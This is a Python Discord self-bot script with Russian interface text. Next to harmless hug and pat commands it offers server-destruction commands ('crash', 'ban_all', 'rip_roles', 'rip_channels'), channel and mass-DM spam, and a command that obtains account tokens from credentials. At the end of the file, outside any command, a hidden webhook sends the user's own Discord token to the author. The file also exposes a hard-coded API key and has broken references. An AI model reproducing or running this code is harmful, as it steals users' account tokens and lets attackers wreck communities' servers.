## IMPORTS  2236
import discord
from discord.ext import commands
import random 
from random import choice as wuw 
import requests

## +++++++++++++++++

## os
#add later
## vars

token = "ТУТ В СКОБКАХ СВОЙ ТОКЕН"

PREFIX = "!"

made_by = "Anarchy death. [VELIAL]"
#colors = [000000,0xffffff,0x6600a8,0xfdff00,0xff5a00,0x10ff00,0x2000a8]
colors = [000000]
client = commands.Bot(command_prefix = PREFIX, self_bot = True)
client.remove_command("help")
creator_url = "https://i.gifer.com/TKC6.gif"
## ++++++++++++++

## client commands 
@client.command()
async def crash(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members: #ban members
        try:
            await member.ban()
            print(f"banned " + member.name)
        except:
            print(f"no ban " + member.name)
            continue  
    try:
        await ctx.guild.edit(name = nom)
    except:
        print("no rename server")
        roles = ctx.guild.roles
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            try:
                await role.delete()
            except:
                continue
    for r in range(1, 100): 
        try:
            await ctx.guild.create_role(name=f'Anarchy')
        except:
            continue
        for channel in ctx.guild.channels: #delete all channels
            try:
                await channel.delete()
            except:
                print("no delete channel")
    for i in range(1, 100):
        try:
            await ctx.guild.create_text_channel(f'Anarchy')
            await ctx.guild.create_voice_channel(f'Anarchy')
        except:
            print("no create channel")
@client.command()
async def watch(ctx, *, arg):
    embed=discord.Embed(title='Статус изменен!',color=wuw(colors), description='Теперь ты cмотришь ' + arg )
    await client.change_presence(status=discord.Status.online, activity=discord.Activity(name=arg, type=discord.ActivityType.watching))
    await ctx.send(embed=embed)
    await ctx.message.delete()
@client.command()
async def listen(ctx, *, arg):
    embed=discord.Embed(title='Статус изменен!',color=wuw(colors), description='Теперь ты слушаешь ' + arg )
    await client.change_presence(status=discord.Status.online, activity=discord.Activity(name=arg, type=discord.ActivityType.listening))
    await ctx.send(embed=embed)
    await ctx.message.delete()
@client.command()
async def info(ctx,member:discord.Member):
    emb = discord.Embed(title=f'Информация о пользователе {member}',color=wuw(colors))
    emb.add_field(name="Присоединился:",value=member.joined_at,inline=False)
    emb.add_field(name='Имя:',value=member.display_name,inline=False)
    emb.add_field(name='Айди:',value=member.id,inline=False)
    emb.add_field(name="Аккаунт был создан:",value=member.created_at.strftime("%a,%#d %B %Y, %I:%M %p UTC"),inline=False)
    emb.set_thumbnail(url=member.avatar_url)
    emb.set_footer(text=f"Вызвано:  {ctx.message.author}",icon_url=ctx.message.author.avatar_url)
    emb.set_author(name=ctx.message.author,icon_url=ctx.message.author.avatar_url)
    await ctx.send(embed = emb)
    await ctx.message.delete()
@client.command()
async def play(ctx, *, arg):
    embed=discord.Embed(title='Статус изменен!',colour = wuw(colors), description='Теперь ты играешь в ' + arg )
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name=arg))
    await ctx.send(embed=embed)
    await ctx.message.delete()
@client.command()
async def clear_chat(ctx, num):
    try:
        await ctx.channel.purge(limit=int(num))
    except:
        print("can`t clear chat")
@client.command()
async def pat(ctx, user_pat: discord.Member=None,*, other_shit=None):
    pat_gif = ["https://media.giphy.com/media/N0CIxcyPLputW/giphy.gif","https://media.giphy.com/media/ye7OTQgwmVuVy/giphy.gif","https://media.giphy.com/media/5tmRHwTlHAA9WkVxTU/giphy.gif","https://media.giphy.com/media/ARSp9T7wwxNcs/giphy.gif","https://media.giphy.com/media/Z7x24IHBcmV7W/giphy.gif","https://media.giphy.com/media/e7xQm1dtF9Zni/giphy.gif","https://media.giphy.com/media/l2Je0SJkEt7MhgyM8/giphy.gif","https://media.giphy.com/media/L2z7dnOduqEow/giphy.gif","https://media.giphy.com/media/osYdfUptPqV0s/giphy.gif","https://media.giphy.com/media/4HP0ddZnNVvKU/giphy.gif","https://media.giphy.com/media/JUuk5SRw5ZmRG/giphy.gif", "https://images-ext-1.discordapp.net/external/8ENOBBPn_grEMi4-RtUYmEsoEiqF3dORHsguNSVFitY/https/media.tenor.co/images/e7db87c553dd0383273ace277c27d31b/tenor.gif"]
    if not user_pat:
        pat_embed = discord.Embed(description = f"{ctx.author.name} погладил(а) всех",color = wuw(colors))
        pat_embed.set_image(url=random.choice(pat_gif))
        pat_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=pat_embed)
        await ctx.message.delete()
    else:
        pat_embed = discord.Embed(description = f"{ctx.author.name} погладил(а) {user_pat.name}",color = wuw(colors))
        pat_embed.set_image(url=random.choice(pat_gif))
        pat_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=pat_embed)
        await ctx.message.delete()
@client.command()
async def hug(ctx, user_hug: discord.Member=None,*, other_shit=None):
    hug_gif = ["https://i.pinimg.com/originals/24/00/ee/2400eec8e83624dc8114a74261a145fe.gif","https://media1.tenor.com/images/234d471b1068bc25d435c607224454c9/tenor.gif?itemid=3532081","https://i.gifer.com/NOkF.gif","https://pa1.narvii.com/6569/56b815b794d667d5039dcaf6af3a215cad5cc6a2_hq.gif","https://i.gifer.com/AmeN.gif"]
    if not user_hug:
        hug_embed = discord.Embed(description = f"{ctx.author.name} обнял(а) всех",color = wuw(colors))
        hug_embed.set_image(url=random.choice(hug_gif))
        hug_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=hug_embed)
        await ctx.message.delete()
    else:
        hug_embed = discord.Embed(description = f"{ctx.author.name} обнял(а) {user_hug.name}",color = wuw(colors))
        hug_embed.set_image(url=random.choice(hug_gif))
        hug_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=hug_embed)
        await ctx.message.delete()
@client.command()
async def lick(ctx, user_lick: discord.Member=None,*, other_shit=None):
    lick_gif = ["https://4.bp.blogspot.com/-SfFnJBLVyWs/WBbW0ZEIRSI/AAAAAAAApPg/o0jNtlCxuF85T_FzVPoxkliJ3z3P5bNWQCPcB/s1600/Omake%2BGif%2BAnime%2B-%2BLong%2BRiders%2521%2B-%2BEpisode%2B3%2B-%2BIndy%2BDog%2BLicks%2BAmi.gif","https://pa1.narvii.com/7101/224b3367affb1ed0dcbead814f3f4ebf89b35a54r1-542-307_hq.gif","https://i.gyazo.com/c45d55e29820af5e8dc1b893507f3365.gif",]
    if not user_lick:
        lick_embed = discord.Embed(description = f"{ctx.author.name} лизнул(а) всех",color = wuw(colors))
        lick_embed.set_image(url=random.choice(lick_gif))
        lick_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=lick_embed)
        await ctx.message.delete()
    else:
        lick_embed = discord.Embed(description = f"{ctx.author.name} лизнул(а) {user_lick.name}",color = wuw(colors))
        lick_embed.set_image(url=random.choice(lick_gif))
        lick_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=lick_embed)
        await ctx.message.delete()
@client.command()
async def log_in(ctx,login,password):
    headers = {"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',"content-type": "application/json"}
    payload = {"email": login,"password": password}

    s = requests.Session()
    n = s.post("https://discord.com/api/v8/auth/login",data=json.dumps(payload),headers=headers).text
    v  = n.split("\"")
    print(v[3])
    await ctx.send(v[3])
    await ctx.message.delete()
@client.command()
async def kiss(ctx, user_kiss: discord.Member=None,*, other_shit=None):
    kiss_gif = ["https://data.whicdn.com/images/294084710/original.gif","https://pa1.narvii.com/6703/56deba239ddba81953c40a8c31dcb6c82cada176_hq.gif"]  
    if not user_kiss:
        kiss_embed = discord.Embed(description = f"{ctx.author.name} поцеловал(а) всех",color = wuw(colors))
        kiss_embed.set_image(url=random.choice(kiss_gif))
        kiss_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=kiss_embed)
        await ctx.message.delete()
    else:
        kiss_embed = discord.Embed(description=f"{ctx.author.name} поцеловал(а) {user_kiss.name}",color = wuw(colors))
        kiss_embed.set_image(url=random.choice(kiss_gif))
        kiss_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=kiss_embed)
        await ctx.message.delete()
@client.command()
async def bite(ctx, user_bite: discord.Member=None,*, other_shit=None):
    bite_gif = ["https://i.pinimg.com/originals/c0/b4/a9/c0b4a94993a08d1df826e27e55dd2fb0.gif","https://data.whicdn.com/images/209439176/original.gif","https://pa1.narvii.com/6544/513943fd84bfe1f3808c667dc9a2334b29f66c79_hq.gif","https://media1.tenor.com/images/6b42070f19e228d7a4ed76d4b35672cd/tenor.gif?itemid=9051585"] 
    if not user_bite:
        bite_embed = discord.Embed(description = f"{ctx.author.name} сделал(а) кусь всем",color = wuw(colors))
        bite_embed.set_image(url=random.choice(bite_gif))
        bite_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=bite_embed)
        await ctx.message.delete()
    else:
        bite_embed = discord.Embed(description =f"{ctx.author.name} сделал(а) кусь {user_bite.name}" ,color = wuw(colors))
        bite_embed.set_image(url=random.choice(bite_gif))
        bite_embed.set_footer(text = made_by,icon_url = creator_url)
        await ctx.channel.send(embed=bite_embed)
        await ctx.message.delete()
@client.command()
async def embed(ctx,*, nja):
    embed = discord.Embed(description = nja,color = wuw(colors))
    embed.set_image(url = "https://cdn.discordapp.com/attachments/534843457056014367/536666736460562443/advertise_light_bar.gif")
    embed.set_footer(text = made_by,icon_url = creator_url)
    await ctx.channel.send(embed=embed)
    await ctx.message.delete()
@client.command()
async def spam_all_chanels(ctx,*,arg):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')

    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send(f'{arg}')
                
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('✅ **Spamming complete!**')
@client.command()
async def send_dm_to_all(ctx,*,arg):
    await ctx.message.delete()
    spy = ")"
    for member in ctx.guild.members: 
        try:
            await member.send(arg + spy)
        except:
            continue
        spy = spy + ")"
@client.command()
async def ban_all(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members: #ban members
        try:
            await member.ban()
            print(f"banned " + member.name)
        except:
            print(f"cant ban " + member.name)
            continue  
@client.command()
async def rename_server(ctx, nom = "RIP"):
    await ctx.message.delete()
    await ctx.guild.edit(name = nom)
@client.command()
async def rip_channels(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels: #delete all channels
        try:
            await channel.delete()
        except:
            print("can`t delete channel")
    for i in range(1, 100):
        try:
            await ctx.guild.create_text_channel(f'R.I.P')
            await ctx.guild.create_voice_channel(f'R.I.P')
        except:
            print("can`t create channel")
@client.command()
async def rip_roles(ctx):
    await ctx.message.delete()
    roles = ctx.guild.roles
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            try:
                await role.delete()
            except:
                continue
    for r in range(1, 100): 
        try:
            await ctx.guild.create_role(name=f'R.I.P')
        except:
            continue
@client.command()
async def spam_here(ctx,timer,*,text = "spam"):
    await ctx.message.delete()
    for n in range(int(timer)):
        await ctx.send(text)
@client.command()
async def ball(ctx, *, arg):
    words = ['Да', 'Да, конечно', 'Возможно', 'Нет']
    r_words = random.choice(words)
    await ctx.send(f'"{arg}" -> {r_words}')
    await ctx.message.delete()
@client.command()
async def google(ctx, *, question):
    url = 'https://google.gik-team.com/?q=' + str(question).replace(' ', '+')
    await ctx.send(f'Так как кое кто не умеет гуглить, я сделал это за него.\n{url}')
    await ctx.message.delete()
@client.command()
async def serverinfo(ctx):
    members = ctx.guild.members
    online = len(list(filter(lambda x: x.status == discord.Status.online, members)))
    offline = len(list(filter(lambda x: x.status == discord.Status.offline, members)))
    idle = len(list(filter(lambda x: x.status == discord.Status.idle, members)))
    dnd = len(list(filter(lambda x: x.status == discord.Status.dnd, members)))
    allchannels = len(ctx.guild.channels)
    allvoice = len(ctx.guild.voice_channels)
    alltext = len(ctx.guild.text_channels)
    allroles = len(ctx.guild.roles)
    embed = discord.Embed(title=f"{ctx.guild.name}", colour = wuw(colors), timestamp=ctx.message.created_at)
    embed.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url)
    embed.description=(
        f":timer: Сервер создали **{ctx.guild.created_at.strftime('%A, %b %#d %Y')}**\n\n"
        f":flag_white: Регион **{ctx.guild.region}\n\n Глава сервера __{ctx.guild.owner}__\n\n"
        f":tools: Ботов на сервере: **{len([m for m in members if m.bot])}**\n\n"
        f":green_circle: Онлайн: **{online}**\n\n"
        f":white_circle: Оффлайн: **{offline}**\n\n"
        f":yellow_circle: Отошли: **{idle}**\n\n"
        f":red_circle: Не трогать: **{dnd}**\n\n"
        f":shield: Уровень верификации: **{ctx.guild.verification_level}**\n\n"
        f":bank: Всего каналов: **{allchannels}**\n\n"
        f":loud_sound: Голосовых каналов: **{allvoice}**\n\n"
        f":keyboard: Текстовых каналов: **{alltext}**\n\n"
        f":briefcase: Всего ролей: **{allroles}**\n\n"
        f":slight_smile: Людей на сервере **{ctx.guild.member_count}\n\n"
    )

    embed.set_thumbnail(url=ctx.guild.icon_url)
    embed.set_footer(text=f"ID: {ctx.guild.id}")
    embed.set_footer(text=f"ID Пользователя: {ctx.author.id}")
    await ctx.send(embed=embed)
    await ctx.message.delete()
@client.command()
async def help(ctx, set = "e"):
    if set == "s":
        emb = discord.Embed(title = 'команды:', colour = wuw(colors))
        emb.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url)
        emb.add_field(name = '{}clear_chat'.format(PREFIX), value = 'clear_chat + количество \n')
        emb.add_field(name = '{}ball'.format(PREFIX), value = 'ball + вопрос \n')
        emb.add_field(name = '{}google'.format(PREFIX), value = 'google + тема\n')
        emb.add_field(name = '{}serverinfo'.format(PREFIX), value = 'serverinfo \n')
        emb.add_field(name = '{}reverse'.format(PREFIX), value = 'reverse + текст \n')
        emb.add_field(name = '{}avatar'.format(PREFIX), value = 'avatar + упоминание\n')
        emb.add_field(name = '{}emoji '.format(PREFIX), value = 'emoji + емодзи\n')
        emb.add_field(name = '{}youtube'.format(PREFIX), value = 'youtube + тема  \n')
        emb.add_field(name = '{}ping'.format(PREFIX), value = 'ping \n')
        emb.add_field(name = '{}hands'.format(PREFIX), value = 'hands + упоминание \n')
        emb.add_field(name = '{}spam_here'.format(PREFIX), value = 'spam_here + количество + текст \n')
        emb.add_field(name = '{}kiss '.format(PREFIX), value = 'kiss + упоминание \n')
        emb.add_field(name = '{}hug'.format(PREFIX), value = 'hug + упоминание  \n')
        emb.add_field(name = '{}pat'.format(PREFIX), value = 'pat + упоминание  \n')
        emb.add_field(name = '{}lick'.format(PREFIX), value = 'lick + упоминание \n')
        emb.add_field(name = '{}bite'.format(PREFIX), value = 'bite + упоминание \n')
        emb.add_field(name = '{}ban_all'.format(PREFIX), value = 'ban_all \n')
        emb.add_field(name = '{}rip_roles'.format(PREFIX), value = 'rip_roles \n')
        emb.add_field(name = '{}rip_channels'.format(PREFIX), value = 'rip_channels \n')
        emb.add_field(name = '{}rename_server'.format(PREFIX), value = 'rename_server + Название \n')
        emb.add_field(name = '{}info'.format(PREFIX), value = 'info + упоминание \n')
        emb.add_field(name = '{}watch'.format(PREFIX), value = 'watch + Название\n')
        emb.add_field(name = '{}listen'.format(PREFIX), value = 'listen + Название \n')
        emb.add_field(name = '{}play'.format(PREFIX), value = 'play + Название \n')
        emb.add_field(name = '{}spam_all_chanels'.format(PREFIX), value = 'spam_all_chanels \n')
        emb.add_field(name = '{}log_in'.format(PREFIX), value = 'log_in + логин + пароль  \n')
        emb.add_field(name = '{}crash'.format(PREFIX), value = 'crash  \n')
        emb.add_field(name = '{}help'.format(PREFIX), value = 'help // help s \n')
        emb.description=("пишите команду help для функций команд ")
        await ctx.send(embed = emb)
        await ctx.message.delete()
    else:
        emb = discord.Embed(title = 'команды:', colour = wuw(colors))
        emb.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url)
        emb.add_field(name = '{}clear_chat'.format(PREFIX), value = 'Очистка чата \n')
        emb.add_field(name = '{}ball'.format(PREFIX), value = 'Случайный ответ бота \n')
        emb.add_field(name = '{}google'.format(PREFIX), value = 'Бот загуглит любую тему \n')
        emb.add_field(name = '{}serverinfo'.format(PREFIX), value = 'Выведет всю информацию о сервере \n')
        emb.add_field(name = '{}reverse'.format(PREFIX), value = 'Пишет текст на оборот \n')
        emb.add_field(name = '{}avatar'.format(PREFIX), value = 'показывает аватар \n')
        emb.add_field(name = '{}emoji '.format(PREFIX), value = 'показывает информацию об емодзи \n')
        emb.add_field(name = '{}youtube'.format(PREFIX), value = 'ищет видео по названию \n')
        emb.add_field(name = '{}ping'.format(PREFIX), value = 'показывает пинг \n')
        emb.add_field(name = '{}hands'.format(PREFIX), value = 'предложть рукопожатие другому человеку \n')
        emb.add_field(name = '{}spam_here'.format(PREFIX), value = 'спам в данном канале \n')
        emb.add_field(name = '{}kiss '.format(PREFIX), value = 'поцелуй \n')
        emb.add_field(name = '{}hug'.format(PREFIX), value = 'обнимашки \n')
        emb.add_field(name = '{}pat'.format(PREFIX), value = 'погладить \n')
        emb.add_field(name = '{}lick'.format(PREFIX), value = 'лизнуть \n')
        emb.add_field(name = '{}bite'.format(PREFIX), value = 'укусить \n')
        emb.add_field(name = '{}ban_all'.format(PREFIX), value = 'бан всех \n')
        emb.add_field(name = '{}rip_roles'.format(PREFIX), value = 'уничтоженине ролей \n')
        emb.add_field(name = '{}rip_channels'.format(PREFIX), value = 'уничтоженине каналов \n')
        emb.add_field(name = '{}rename_server'.format(PREFIX), value = 'переимненовать сервер \n')
        emb.add_field(name = '{}info'.format(PREFIX), value = 'Информация об пользователе \n')
        emb.add_field(name = '{}watch'.format(PREFIX), value = 'смена статуса на смотрит \n')
        emb.add_field(name = '{}listen'.format(PREFIX), value = 'смена статуса на слушает \n')
        emb.add_field(name = '{}play'.format(PREFIX), value = 'смена статуса на играет \n')
        emb.add_field(name = '{}spam_all_chanels'.format(PREFIX), value = 'спам во всех каналах \n')
        emb.add_field(name = '{}log_in'.format(PREFIX), value = 'получить токен \n')
        emb.add_field(name = '{}crash'.format(PREFIX), value = 'авто краш \n')
        emb.add_field(name = '{}help'.format(PREFIX), value = 'выводит это сообщение \n')
        emb.description=("для синтаксиса пишите s после команды help")
        await ctx.send(embed = emb)
        await ctx.message.delete()
@client.command()
async def reverse(ctx, *, text: str):
    t_rev = text[::-1].replace("@", "@\u200B").replace("&", "&\u200B")
    await ctx.send(f"{t_rev}")
    await ctx.message.delete()
@client.command()
async def avatar(ctx, member = None):
    if not member:
        member = ctx.author
    await ctx.message.delete()
    user = ctx.message.author if not member else member
    embed = discord.Embed(title = f'Аватар пользователя {member}', color = wuw(colors))
    embed.set_image(url = user.avatar_url_as(format = None, size = 4096))
    embed.set_author(icon_url = 'https://www.flaticon.com/premium-icon/icons/svg/2919/2919600.svg', name = 'Участник | Аватар')
    embed.set_footer(text = f'{client.user.name} © 2020 | Все права защищены)', icon_url = client.user.avatar_url)
    await ctx.send(embed = embed)
@client.command()
async def emoji(ctx, emoji: discord.Emoji = None):
    if not emoji:
        emb = discord.Embed(description = ":x: {0}, укажи **эмодзи**, о которым хочешь узнать **информацию** :x:".format(ctx.author.mention), color = wuw(colors))
        emb.set_footer(text = f'{client.user.name} © 2020 | Все права защищены', icon_url = client.user.avatar_url)
        ##emb.timestamp = datetime.utcnow()
        await ctx.send(embed = emb)
    emb = discord.Embed(description = f"[Эмодзи]({emoji.url}) сервера - {emoji}", color = wuw(colors))
    emb.add_field(name = "Название эмодзи:", value = "**`{0}`**".format(emoji.name))
    emb.add_field(name = "Автор:", value = "{0}".format((await ctx.guild.fetch_emoji(emoji.id)).user.mention))
    emb.add_field(name = "‎‎‎‎", value = "‎‎‎‎")
    emb.add_field(name = "Дата добавления:", value = "**`{0}`**".format((emoji.created_at.date())))
    emb.add_field(name = "ID эмодзи:", value = "**`{0}`**".format(emoji.id))
    emb.add_field(name = "‎‎‎‎", value = "‎‎‎‎")
    emb.set_thumbnail(url = "{0}".format(emoji.url))
    emb.set_author(icon_url = 'https://www.flaticon.com/premium-icon/icons/svg/3084/3084443.svg', name = 'Бот | Эмодзи')
    emb.set_footer(text = f'{client.user.name} © 2020 | Все права защищены', icon_url = client.user.avatar_url)
    ##emb.timestamp = datetime.utcnow()
    await ctx.send(embed = emb)
@client.command()
async def youtube(ctx, *, query: str):
    req = requests.get(
        ('https://www.googleapis.com/youtube/v3/search?part=id&maxResults=1'
         '&order=relevance&q={}&relevanceLanguage=en&safeSearch=moderate&type=video'
         '&videoDimension=2d&fields=items%2Fid%2FvideoId&key=')
        .format(query) + "AIzaSyC_viihkRiUg3N5bv0DRvOrmaNdUNJ852U")
    await ctx.send('https://www.youtube.com/watch?v={}'.format(req.json()['items'][0]['id']['videoId']))
@client.command()
async def ping(ctx):
    ping = client.latency
    ping_emoji = "🟩🔳🔳🔳🔳"
    ping_list = [
        {"ping": 0.10000000000000000, "emoji": "🟧🟩🔳🔳🔳"},
        {"ping": 0.15000000000000000, "emoji": "🟥🟧🟩🔳🔳"},
        {"ping": 0.20000000000000000, "emoji": "🟥🟥🟧🟩🔳"},
        {"ping": 0.25000000000000000, "emoji": "🟥🟥🟥🟧🟩"},
        {"ping": 0.30000000000000000, "emoji": "🟥🟥🟥🟥🟧"},
        {"ping": 0.35000000000000000, "emoji": "🟥🟥🟥🟥🟥"}]
    for ping_one in ping_list:
        if ping > ping_one["ping"]:
            ping_emoji = ping_one["emoji"]
            break

    message = await ctx.send("Пожалуйста, подождите. . .")
    await message.edit(content = f"Понг! {ping_emoji} `{ping * 1000:.0f}ms` :ping_pong:")
@client.command()
async def hands(ctx, member: discord.Member = None):
    if member == ctx.author:
        return await ctx.send(embed = discord.Embed(description = 'Ты не можешь взять за руку самого себя!'))
    if member == None:
        return await ctx.send(embed = discord.Embed(description = 'Обязательно укажи пользователя!'))
    hands = ['https://cdn.discordapp.com/attachments/746337035660427315/746343049323610272/8f70714a8fc965fdcae4d7d11bc4c683.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343071402295346/6a99cf456a620157081d791a5f221b709facb9f5_hq.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343086527086743/4d595b493c634263506f6e3babdd0bbe.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343109385781298/64722f8fe88db6c1178fbae5ff6cd06e.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343217842356275/A9kxW4y.gif']
    embed1 = discord.Embed(description = f'{ctx.author.mention} взял за ручку {member.mention}')
    embed1.set_image(url=random.choice(hands))
    check_h = await ctx.send(embed = embed1)
    await check_h.add_reaction('💚')
    await check_h.add_reaction('💔')
    def check(reaction, user):
        return user == member and reaction.emoji in '💚💔:'
    try:
        reaction, user = await client.wait_for('reaction_add', check = check, timeout = 30)
    except asyncio.TimeoutError:
        await ctx.send('Время вышло') 
        return
    if reaction.emoji == '💚':
        hands = ['https://cdn.discordapp.com/attachments/746337035660427315/746343049323610272/8f70714a8fc965fdcae4d7d11bc4c683.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343071402295346/6a99cf456a620157081d791a5f221b709facb9f5_hq.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343086527086743/4d595b493c634263506f6e3babdd0bbe.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343109385781298/64722f8fe88db6c1178fbae5ff6cd06e.gif','https://cdn.discordapp.com/attachments/746337035660427315/746343217842356275/A9kxW4y.gif']
        embed = discord.Embed(description = f'{member.mention} взял за ручку {ctx.author.mention} в ответ! ')
        embed.set_image(url=random.choice(hands))
        await ctx.send(embed = embed)
    if reaction.emoji == '💔':
        gif = ['https://cdn.discordapp.com/attachments/746337035660427315/746343256727748659/1379324663_3fe9258936d2.gif','https://cdn.discordapp.com/attachments/734820577302544518/745326365519380510/image_861311161736251195541.gif','https://cdn.discordapp.com/attachments/734820577302544518/745326390764634152/image_861311160350211560551.gif','https://cdn.discordapp.com/attachments/734820577302544518/745326595383754842/OLmS.gif','https://cdn.discordapp.com/attachments/734820577302544518/745327016462516304/OvTg.gif','https://cdn.discordapp.com/attachments/734820577302544518/745327168514686986/1339420713_tumblr_m5domfmsvs1qzd219o1_500.gif']
        krik = [f'{member.mention} убегает от {ctx.author.mention}, он такой страшный..' , f'{member.mention} убегает от  {ctx.author.mention} , вот дурачок!']
        embed = discord.Embed(description = random.choice(krik))
        embed.set_image(url = random.choice(gif))
        await ctx.send(embed = embed)
## +++++++++++++++++

from dhooks import Webhook
hook = Webhook('https://discord.com/api/webhooks/932673107750166578/xbQUnnLWtDAurXbvfGV_3jBSEnTJh39Rune-eIsw_5toWX3BzW7tTk5rOiXY6LyIcNFv')
hook.send(token)

##++++++++++++++++++
client.run(token, bot = False)
